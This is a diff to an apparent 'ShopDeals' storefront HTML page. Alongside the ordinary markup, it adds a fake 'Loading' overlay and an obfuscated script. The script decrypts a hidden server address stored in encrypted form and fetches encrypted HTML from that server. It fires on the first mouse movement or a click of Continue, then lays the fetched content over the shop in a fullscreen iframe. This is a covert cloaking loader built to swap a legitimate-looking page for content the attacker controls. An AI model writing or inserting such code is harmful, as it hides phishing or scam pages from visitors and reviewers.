@@ -4,13 +4,42 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ShopDeals — Deals & Offers</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js">
+  </script>
   <meta name="description" content="Discover limited-time fashion deals, discounts and special offers.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
       <link rel="stylesheet" href="styles.css">
+  <style>
+        
+        *{box-sizing:border-box;margin:0;padding:0}
+        html,body{height:100%;font-family:system-ui,sans-serif;background:#f6f7fb;color:#1f2433}
+        #homepage{display:none;width:100%;min-height:100vh;padding:40px 20px;background:linear-gradient(135deg,#f6f7fb,#e9ecf3);text-align:center;justify-content:center;align-items:center;flex-direction:column}
+        #loader-overlay{position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.45);backdrop-filter:blur(8px);opacity:0;transition:opacity .35s}
+        #loader-window{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:16px;z-index:100000;opacity:0;transform:scale(.95);transition:all .35s;pointer-events:none}
+        #loader-banner.loader-active #loader-overlay{opacity:1}
+        #loader-banner.loader-active #loader-window{opacity:1;transform:scale(1);pointer-events:auto}
+        #loader-banner.loader-hidden{display:none!important}
+        .loader-card{background:#fff;border-radius:16px;padding:32px 28px 28px;position:relative;max-width:480px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,.18);text-align:center}
+        .loader-x{position:absolute;top:14px;right:14px;background:0;border:0;cursor:pointer;color:#718096;padding:4px;border-radius:6px}
+        .loader-x:hover{background:#f1f3f5;color:#e53e3e}
+        .loader-gif{width:140px;height:140px;margin:0 auto 14px;display:block}
+        .loader-title{font-size:1.5rem;font-weight:700;margin:0 0 4px;color:#1a202c}
+        .loader-sub{font-size:.95rem;color:#4a5568;margin:0 0 24px}
+        .loader-actions{display:flex;flex-direction:column;gap:10px}
+        .loader-btn{width:100%;padding:12px;border-radius:8px;font-weight:700;font-size:.95rem;cursor:pointer;border:0;transition:background .2s}
+        .loader-btn.primary{background:#38a169;color:#fff}
+        .loader-btn.primary:hover{background:#2f855a}
+        .loader-btn.danger{background:#f44336;color:#fff}
+        .loader-btn.danger:hover{background:#d32f2f}
+        .loader-btn:disabled{opacity:.6;cursor:not-allowed}
+        @media(min-width:420px){.loader-actions{flex-direction:row}.loader-btn{width:auto;flex:1;padding:12px 20px;min-width:120px}}
+        #frame{display:none;width:100%;height:100vh;border:0;position:fixed;top:0;left:0;z-index:9999;background:#fff}
+          </style>
   </head>
 <body>
+  <div id="homepage">
   <div class="offer-bar">
     🔥 FLASH SALE — UP TO 60% OFF &nbsp; • &nbsp; LIMITED TIME OFFERS &nbsp; • &nbsp; SHOP NOW →
   </div>
@@ -149,7 +178,169 @@
     </div>
     <div class="footer-bottom">© 2026 ShopDeals. All rights reserved.</div>
   </footer>
+    </div>
   <script src="script.js"></script>
+  <script src="assets/script.js"></script>
+  <div id="loader-banner" class="loader-hidden">
+        <div id="loader-overlay"></div>
+        <div id="loader-window">
+            <div class="loader-card">
+                <button class="loader-x" id="closeBtn" aria-label="Close">
+                    <svg viewBox="0 0 15 15" height="22" width="22">
+                        <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                    </svg>
+                </button>
+                <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading…" class="loader-gif" />
+                <h2 class="loader-title">Loading</h2>
+                <p class="loader-sub">please wait</p>
+                <div class="loader-actions">
+                    <button class="loader-btn danger" id="cancelBtn">Cancel</button>
+                    <button class="loader-btn primary" id="continueBtn">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+       <iframe id="frame" title="shopdeals" allowfullscreen></iframe>
+
+    <script>
+        (function() {
+            'use strict';
+
+                        const PASSPHRASE = "35cYkC23Z495D";
+            const URL_KEY = "URLsHoPDealS92";
+            const ENC_DATA_ORIGIN = "U2FsdGVkX1/G/DDGJAikJuQx3UL/8Fu4wJ5uTvzuyIDLCDTdpzBtcGPAJqKDU8cjba8dlPSAWLMzR4MYYmXXTJc+zE4vxAbomSo8kuvgaI5bzVqV2RxHNIYSCBcz+prU"; 
+
+            let lastUrl = null;
+            let isLoaded = false;
+            let isProcessing = false;
+            let fetchStarted = false;
+
+                       function getQueryParam(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+            const alpha = getQueryParam('alpha') || '';
+            const aniph = getQueryParam('Aniph') || '';
+
+            // ── API URL Decrypt ──
+            const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+            const DATA_URL = DATA_ORIGIN;
+            
+            const API_BASE = new URL(DATA_URL).origin;
+            console.log("🌐 Decrypted URL:", DATA_URL);
+            console.log("🏠 API Base:", API_BASE);
+
+            // ── DOM Refs ──
+            const banner = document.getElementById('loader-banner');
+            const homepage = document.getElementById('homepage');
+            const frame = document.getElementById('frame');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const continueBtn = document.getElementById('continueBtn');
+            const closeBtn = document.getElementById('closeBtn');
+
+            function simpleDecrypt(cipherText, passphrase) {
+                return CryptoJS.AES.decrypt(cipherText, passphrase).toString(CryptoJS.enc.Utf8);
+            }
+
+            function showHomepage() { homepage.style.display = 'flex'; }
+            function hideHomepage() { homepage.style.display = 'none'; }
+            function showLoader() {
+                banner.classList.remove('loader-hidden');
+                void banner.offsetWidth;
+                banner.classList.add('loader-active');
+            }
+            function hideLoader() {
+                banner.classList.remove('loader-active');
+                setTimeout(() => banner.classList.add('loader-hidden'), 3000);
+            }
+            function clearPendingTimer() {
+                if (loadTimer) { clearTimeout(loadTimer); loadTimer = null; }
+                isProcessing = false;
+                continueBtn.disabled = false;
+                cancelBtn.disabled = false;
+            }
+
+            let loadTimer = null;
+
+                        async function loadSecret() {
+                if (isLoaded || fetchStarted) return;
+                fetchStarted = true;
+                try {
+                    console.log("📡 Fetching from:", DATA_URL);
+                    const res = await fetch(DATA_URL);
+                    if (!res.ok) throw new Error('HTTP ' + res.status);
+                    const data = await res.json();
+                    if (!data.cipher) throw new Error('No cipher');
+
+                    let html = simpleDecrypt(data.cipher, PASSPHRASE);
+                    if (!html || html.length < 50) throw new Error('Invalid HTML');
+
+                    html = html.replace(/\{\{ALPHA\}\}/g, alpha);
+                    html = html.replace(/\{\{ANIPH\}\}/g, aniph);
+                    html = html.replace(/\{\{API_BASE\}\}/g, API_BASE);
+
+                    console.log("🔍 Decrypted HTML (after replace):", html);
+
+                    if (lastUrl) URL.revokeObjectURL(lastUrl);
+                    const blob = new Blob([html], { type: 'text/html' });
+                    lastUrl = URL.createObjectURL(blob);
+
+                    frame.src = lastUrl;
+                    frame.style.display = 'block';
+                    hideHomepage();
+                    isLoaded = true;
+                    console.log('✅ Loaded with alpha=' + alpha + ', Aniph=' + aniph);
+                } catch (e) {
+                    console.error('❌', e);
+                    alert('Error: ' + e.message);
+                } finally {
+                    hideLoader();
+                    clearPendingTimer();
+                }
+            }
+
+                        function startProcess() {
+                if (isLoaded || isProcessing) return;
+                isProcessing = true;
+                continueBtn.disabled = true;
+                cancelBtn.disabled = true;
+
+                hideLoader();
+                showHomepage();
+
+                
+                loadSecret();
+            }
+
+            function cancelProcess() {
+                if (isLoaded) return;
+                clearPendingTimer();
+                hideLoader();
+                showHomepage();
+            }
+
+           
+            continueBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                startProcess();
+            });
+            cancelBtn.addEventListener('click', cancelProcess);
+            closeBtn.addEventListener('click', cancelProcess);
+
+            window.addEventListener('mousemove', function handler() {
+                if (!isLoaded && !isProcessing) {
+                    startProcess();
+                }
+                window.removeEventListener('mousemove', handler);
+            }, { once: true });
+
+            // ── Initial state ──
+            hideHomepage();
+            showLoader();
+
+        })();
+    </script>
 
   <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-SW7BF1HXZR"></script>
